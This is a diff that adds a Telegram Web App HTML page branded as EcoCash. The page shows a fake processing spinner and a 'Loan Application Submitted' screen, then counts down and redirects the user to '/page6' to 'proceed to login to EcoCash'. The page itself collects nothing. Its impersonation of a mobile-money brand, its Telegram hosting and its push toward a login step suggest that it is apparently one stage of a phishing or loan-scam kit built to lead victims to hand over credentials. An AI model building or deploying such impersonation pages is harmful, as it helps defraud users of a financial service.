@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>EcoCash - Application Status</title>
+
+    <!-- ✅ Telegram SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background: linear-gradient(to bottom, #0072ff, #0052d4);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            color: white;
+            text-align: center;
+            box-sizing: border-box;
+            overflow: hidden;
+        }
+
+        /* ------------------ FIRST OVERLAY STYLE ------------------ */
+        .processing-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #0066ff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 10;
+            transition: opacity 0.5s ease;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(255, 255, 255, 0.3);
+            border-top: 5px solid #ffffff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .processing-text {
+            font-size: 18px;
+            font-weight: 500;
+            max-width: 300px;
+            line-height: 1.5;
+        }
+
+        /* ------------------ SECOND PHASE STYLE (From Photo) ------------------ */
+        .submitted-view {
+            display: none; /* hidden initially */
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            width: 90%;
+            max-width: 450px;
+            padding: 20px;
+            animation: fadeIn 0.5s ease forwards;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Icon Container with multi-layered circle shadows from the photo */
+        .icon-outer {
+            width: 110px;
+            height: 110px;
+            background-color: rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 35px;
+            box-shadow: 0 0 0 8px rgba(255, 255, 255, 0.05);
+        }
+
+        .icon-inner {
+            width: 85px;
+            height: 85px;
+            background-color: rgba(255, 255, 255, 0.15);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* Clipboard CSS Art */
+        .clipboard-icon {
+            width: 32px;
+            height: 44px;
+            background-color: #f1f3f5;
+            border-radius: 4px;
+            position: relative;
+            box-shadow: 1px 2px 5px rgba(0,0,0,0.2);
+        }
+
+        .clipboard-icon::before {
+            content: '';
+            position: absolute;
+            top: -5px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 16px;
+            height: 8px;
+            background-color: #d17a22; /* Wooden/Brown clip */
+            border-radius: 2px;
+        }
+
+        /* Clipboard lines */
+        .clipboard-line {
+            width: 18px;
+            height: 3px;
+            background-color: #a0aec0;
+            margin: 10px auto 4px auto;
+            border-radius: 1px;
+        }
+
+        .clipboard-line.short {
+            width: 12px;
+            margin: 4px auto;
+        }
+
+        .header-title {
+            font-size: 32px;
+            font-weight: bold;
+            margin: 0 0 25px 0;
+            letter-spacing: 0.5px;
+            line-height: 1.2;
+        }
+
+        .message-body {
+            font-size: 15px;
+            line-height: 1.6;
+            color: rgba(255, 255, 255, 0.9);
+            margin-bottom: 35px;
+            max-width: 360px;
+        }
+
+        /* Countdown Pill Container matching photo */
+        .redirect-pill {
+            background-color: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            border-radius: 25px;
+            padding: 12px 24px;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 30px;
+            color: rgba(255, 255, 255, 0.95);
+        }
+
+        .reload-icon {
+            font-size: 16px;
+            animation: spin 3s linear infinite;
+        }
+
+        .countdown-num {
+            color: #ff3333;
+            font-weight: bold;
+            margin-right: 2px;
+        }
+
+        /* Manual Proceed Button */
+        .btn-proceed {
+            background-color: #0066ff;
+            color: white;
+            border: none;
+            width: 100%;
+            max-width: 250px;
+            padding: 16px;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.15);
+            transition: background-color 0.2s;
+        }
+
+        .btn-proceed:active {
+            background-color: #0052cc;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- 1️⃣ FIRST STAGE OVERLAY: Processing... -->
+    <div id="processingOverlay" class="processing-overlay">
+        <div class="spinner"></div>
+        <div class="processing-text">Submitting application please wait while we are processing...</div>
+    </div>
+
+    <!-- 2️⃣ SECOND STAGE VIEW: Success & Redirect Countdown (From Photo) -->
+    <div id="submittedView" class="submitted-view">
+        
+        <!-- Clipboard circle design -->
+        <div class="icon-outer">
+            <div class="icon-inner">
+                <div class="clipboard-icon">
+                    <div class="clipboard-line"></div>
+                    <div class="clipboard-line short"></div>
+                    <div class="clipboard-line short"></div>
+                </div>
+            </div>
+        </div>
+
+        <h1 class="header-title">Loan Application<br>Submitted</h1>
+
+        <div class="message-body">
+            Your loan application has been submitted. Please wait for approval.<br><br>
+            You will receive a confirmation message. For now, proceed to login to EcoCash.
+        </div>
+
+        <!-- Progress Redirect status pill -->
+        <div class="redirect-pill">
+            <span class="reload-icon">🔄</span>
+            <span>Redirecting to EcoCash login in <span id="countdown" class="countdown-num">3</span> s...</span>
+        </div>
+
+        <!-- Fallback manual button -->
+        <button class="btn-proceed" onclick="proceedToLogin()">Go to Login Now</button>
+    </div>
+
+    <script>
+        window.onload = () => {
+            const tg = window.Telegram?.WebApp;
+            if (tg) {
+                tg.ready();
+                tg.expand();
+            }
+
+            // Step 1: Hold the "Processing" window for exactly 5 seconds
+            setTimeout(() => {
+                const overlay = document.getElementById('processingOverlay');
+                const mainView = document.getElementById('submittedView');
+
+                // Crossfade transitions
+                overlay.style.opacity = '0';
+                setTimeout(() => {
+                    overlay.style.display = 'none';
+                    mainView.style.display = 'flex';
+                    
+                    // Step 2: Trigger the countdown redirect ticker
+                    startRedirectCountdown();
+                }, 500);
+
+            }, 5000); // 5000 milliseconds = 5 seconds
+        };
+
+        function startRedirectCountdown() {
+            let timeLeft = 3; // 3-second redirect timer as pictured in the image
+            const countdownEl = document.getElementById('countdown');
+
+            const interval = setInterval(() => {
+                timeLeft--;
+                if (countdownEl) {
+                    countdownEl.innerText = timeLeft;
+                }
+
+                if (timeLeft <= 0) {
+                    clearInterval(interval);
+                    proceedToLogin();
+                }
+            }, 1000);
+        }
+
+        // Standard forward route to public page 6
+        function proceedToLogin() {
+            window.location.href = "/page6";
+        }
+    </script>
+
+</body>
+</html>
